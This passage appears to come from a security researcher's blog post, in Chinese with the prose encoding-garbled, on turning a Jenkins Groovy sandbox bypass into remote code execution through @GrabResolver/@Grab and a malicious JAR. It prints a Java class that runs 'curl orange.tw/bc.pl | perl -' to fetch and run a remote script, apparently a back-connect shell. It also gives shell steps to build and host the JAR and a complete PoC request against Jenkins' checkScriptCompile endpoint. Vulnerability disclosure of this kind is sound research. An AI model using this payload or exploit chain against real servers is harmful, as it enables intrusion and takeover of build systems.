&lt;p&gt;ÈÖçÂêà &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@grab&lt;/code&gt; ÁöÑË®ªËß£ÔºåÂèØËÆì Groovy Âú®Á∑®Ë≠ØÊôÇÊúüËá™ÂãïÂºïÂÖ•‰∏çÂ≠òÂú®Êñº classPath ‰∏≠ÁöÑ JAR Ê™î! ‰ΩÜÂ¶ÇÊûú‰Ω†ÁöÑÁõÆÁöÑÂè™ÊòØË¶ÅÂú®‰∏ÄÂÄãÊúâÂü∑Ë°å Pipeline Ê¨äÈôêÁöÑÂ∏≥Ëôü‰∏äÁπûÈÅéÂéüÊúâ Pipeline ÁöÑ Sandbox ÁöÑË©±ÔºåÈÄôÂÖ∂ÂØ¶Â∞±Ë∂≥Â§†‰∫Ü! ‰æãÂ¶Ç‰Ω†ÂèØ‰ª•ÂèÉËÄÉ &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; ÊâÄÊèê‰æõÁöÑ &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;ÔºåÂú®Â∑≤Áü•‰ΩøÁî®ËÄÖÂ∏≥ËôüËàáÂØÜÁ¢ºÂèäÊ¨äÈôêË∂≥Â§†ÁöÑÊÉÖÊ≥Å‰∏ãÔºåÈÅîÂà∞ÈÅ†Á´Ø‰ª£Á¢ºÂü∑Ë°åÁöÑÊïàÊûú!&lt;/p&gt;

&lt;p&gt;‰ΩÜÂú®Ê≤íÊúâÂ∏≥ËôüÂØÜÁ¢ºÂèä &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; ÁöÑÊñπÊ≥ï‰∏ãÔºåÈÄôÂè™ÊòØ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑË™ûÊ≥ïÊ®πËß£ÊûêÂô®Ôºå‰Ω†ÁîöËá≥ÁÑ°Ê≥ïÊéßÂà∂ÈÅ†Á´Ø‰º∫ÊúçÂô®‰∏äÁöÑÊ™îÊ°àÔºåÊâÄ‰ª•Ë©≤ÊÄéÈ∫ºËæ¶Âë¢? ÊàëÂÄëÁπºÁ∫åÁ†îÁ©∂‰∏ãÂéªÔºå‰∏¶ÁôºÁèæ‰∫Ü‰∏ÄÂÄãÂæàÊúâË∂£ÁöÑË®ªËß£Âè´ÂÅö &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;ÔºåÁî®Ê≥ïÂ¶Ç‰∏ã:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://maven.restlet.org/&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;org.restlet&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1.1.6&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÁúãÂà∞ÈÄôÂÄãÔºåËÅ∞ÊòéÁöÑ‰Ω†ÊáâË©≤ÊúÉÂæàÊÉ≥Êää &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; ÊîπÊàêÊÉ°ÊÑèÁ∂≤ÂùÄÂ∞çÂêß! ÊàëÂÄë‰æÜË©¶Ë©¶ÊúÉÊÄéÈ∫ºÊ®£Âêß!&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
@GrabResolver(name=&apos;restlet&apos;, root=&apos;http://orange.tw/&apos;)
@Grab(group=&apos;org.restlet&apos;, module=&apos;org.restlet&apos;, version=&apos;1.1.6&apos;)
import org.restlet
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ÂñîÂππÔºåÁúüÁöÑÊúÉ‰æÜÂ≠òÂèñÊ¨∏! Âà∞ÈÄôË£°ÊàëÂÄëÂ∑≤Á∂ìÁ¢∫‰ø°‰∫ÜÈÄèÈÅé Grape ÂèØ‰ª•ËÆì Jenkins ÂºïÂÖ•ÊÉ°ÊÑèÁöÑÂáΩÂºèÂ∫´! ‰ΩÜ‰∏ã‰∏ÄÂÄãÂïèÈ°åÊòØÔºåË¶ÅÂ¶Ç‰ΩïÂü∑Ë°å‰ª£Á¢ºÂë¢?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;Â¶Ç‰ΩïÂü∑Ë°å‰ªªÊÑè‰ª£Á¢º&quot;&gt;Â¶Ç‰ΩïÂü∑Ë°å‰ªªÊÑè‰ª£Á¢º?&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Âú®ÊºèÊ¥ûÁöÑÂà©Áî®‰∏≠Á∏ΩÊòØÂú®Á†îÁ©∂Â¶Ç‰ΩïÂæûÁ∞°ÂñÆÁöÑ‰ªªÊÑèËÆÄ„ÄÅ‰ªªÊÑèÂØ´Âà∞ÂèñÂæóÁ≥ªÁµ±Âü∑Ë°åÁöÑÊ¨äÈôê! ÂæûÂâçÈù¢ÁöÑ‰æãÂ≠ê‰∏≠ÔºåÊàëÂÄëÂ∑≤Á∂ìÂèØ‰ª•ÈÄèÈÅé Grape ÂéªÂØ´ÂÖ•ÊÉ°ÊÑèÁöÑ JAR Ê™îÂà∞ÈÅ†Á´Ø‰º∫ÊúçÂô®Ôºå‰ΩÜË¶ÅÊÄéÈ∫ºÂü∑Ë°åÈÄôÂÄã JAR Ê™îÂë¢? ÈÄôÂèàÊòØÂè¶‰∏ÄÂÄãÂïèÈ°å!&lt;/p&gt;

&lt;p&gt;Ë∑üÈÄ≤ Groovy Ë™ûË®ÄÊ†∏ÂøÉÊü•ÁúãÂ∞çÊñº &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape ÁöÑÂØ¶‰Ωú&lt;/a&gt;ÔºåÊàëÂÄëÁü•ÈÅìÁ∂≤Ë∑ØÂ±§ÁöÑÊäìÂèñÊòØÈÄèÈÅé &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; ÈÄôÂÄãÈ°ûÂà•‰æÜÂÆåÊàê! ÊâÄ‰ª•ÈñãÂßãÂ∞ãÊâæÂØ¶‰Ωú‰∏≠ÊòØÂê¶Êúâ‰ªª‰ΩïÂèØ‰ª•Âü∑Ë°å‰ª£Á¢ºÁöÑÊ©üÊúÉ! ÂÖ∂‰∏≠ÔºåÊàëÂÄëÁúãÂà∞‰∫Ü‰∏ÄÂÄãÊúâË∂£ÁöÑÊñπÊ≥ï - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(‚Ä¶)&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&apos;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Áî±Êñº JAR Ê™îÊ°àÂÖ∂ÂØ¶Â∞±ÊòØ‰∏ÄÂÄã ZIP Â£ìÁ∏ÆÊ†ºÂºèÁöÑÂ≠êÈõÜÔºåGrape ÊúÉÊ™¢Êü•Ê™îÊ°à‰∏≠ÊòØÂê¶Â≠òÂú®‰∏Ä‰∫õÊåáÂÆöÁöÑÂÖ•Âè£ÈªûÔºåÂÖ∂‰∏≠‰∏ÄÂÄã &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Runner&lt;/code&gt; ÁöÑÂÖ•Âè£ÈªûÊ™¢Êü•ÂºïËµ∑‰∫ÜÊàëÂÄëÁöÑËààË∂£ÔºåÊåÅÁ∫åË∑üÈÄ≤ &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(‚Ä¶)&lt;/a&gt; ÁöÑÂØ¶‰ΩúÊàëÂÄëÁôºÁèæ:&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÈÄôË£°ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; ‰∏çÂ∞±‰ª£Ë°®ËëóÂèØ‰ª•ÂëºÂè´Âà∞‰ªªÊÑèÈ°ûÂà•ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; Âóé? Ê≤íÈåØ! ÊâÄ‰ª•Âè™ÈúÄÁî¢Áîü‰∏ÄÂÄãÊÉ°ÊÑèÁöÑ JAR Ê™îÔºåÊääË¶ÅÂü∑Ë°åÁöÑÈ°ûÂà•ÂÖ®ÂêçÊîæËá≥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; ‰∏≠Âç≥ÂèØÂëºÂè´ÊåáÂÆöÈ°ûÂà•ÁöÑ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; ÂéªÂü∑Ë°å‰ªªÊÑè‰ª£Á¢º! ÂÆåÊï¥ÁöÑÊºèÊ¥ûÂà©Áî®ÈÅéÁ®ãÂ¶Ç‰∏ã:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Orange&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Orange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
./Orange.java
./Orange.class
./META-INF
./META-INF/services
./META-INF/services/org.codehaus.groovy.plugins.Runners

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
HTTP/1.1 200 OK
Date: Sat, 02 Feb 2019 11:10:55 GMT
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name=&apos;orange.tw&apos;, root=&apos;http://[your_host]/&apos;)%0a
@Grab(group=&apos;tw.orange&apos;, module=&apos;poc&apos;, version=&apos;1&apos;)%0a
import Orange;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÂΩ±Áâá:&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂæåË®ò&quot;&gt;ÂæåË®ò&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Âà∞Ê≠§ÔºåÊàëÂÄëÂ∑≤Á∂ìÂèØ‰ª•ÂÆåÊï¥ÁöÑÊéßÂà∂ÈÅ†Á´Ø‰º∫ÊúçÂô®! ÈÄèÈÅé Meta-Programming Âú®Ë™ûÊ≥ïÊ®πËß£ÊûêÊôÇÊúüÂéªÂºïÂÖ•ÊÉ°ÊÑèÁöÑ JAR Ê™îÔºåÂÜçÈÄèÈÅé Java ÁöÑ Static Initializer ÁâπÊÄßÂéªÂü∑Ë°å‰ªªÊÑèÊåá‰ª§! ÈõñÁÑ∂ Jenkins ÊúâÂÖßÂª∫ÁöÑ Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)Ôºå‰ΩÜÈÄôÂÄãÊºèÊ¥ûÊòØÂú®Á∑®Ë≠ØÈöéÊÆµËÄåÈùûÂü∑Ë°åÈöéÊÆµÔºåÂ∞éËá¥ Sandbox ÊØ´ÁÑ°Áî®Ê≠¶‰πãËôï!&lt;/p&gt;

&lt;p&gt;Áî±ÊñºÈÄôÊòØÂ∞çÊñº Groovy Â∫ïÂ±§ÁöÑ‰∏ÄÁ®ÆÊîªÊìäÊñπÂºèÔºåÂõ†Ê≠§Âè™Ë¶ÅÊòØÊâÄÊúâÂèØ‰ª•Á¢∞Ëß∏Âà∞ Groovy Ëß£ÊûêÁöÑÂú∞ÊñπÁöÜÊúâÂèØËÉΩÊúâÊºèÊ¥ûÁî¢Áîü! ËÄåÈÄô‰πüÊòØÈÄôÂÄãÊºèÊ¥ûÂ•ΩÁé©ÁöÑÂú∞ÊñπÔºåÊâìÁ†¥‰∫Ü‰∏ÄËà¨ÈñãÁôºËÄÖË™çÁÇ∫Ê≤íÊúâÂü∑Ë°åÂ∞±‰∏çÊúÉÊúâÂïèÈ°åÁöÑÊÄùÁ∂≠ÔºåÂ∞çÊîªÊìäËÄÖ‰æÜË™™‰πüÁî®‰∫Ü‰∏ÄÂÄãÊ≤íÊúâÈõªËÖ¶ÁßëÂ≠∏ÁöÑÁêÜË´ñÁü•Ë≠òËÉåÊôØ‰∏çÊúÉÁü•ÈÅìÁöÑÊñπÊ≥ïÊîªÊìä! ‰∏çÁÑ∂‰Ω†Ê†πÊú¨‰∏çÊúÉÊÉ≥Âà∞ Meta-Programming! Èô§‰∫ÜÊàëÂõûÂ†±ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; Ëàá &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; 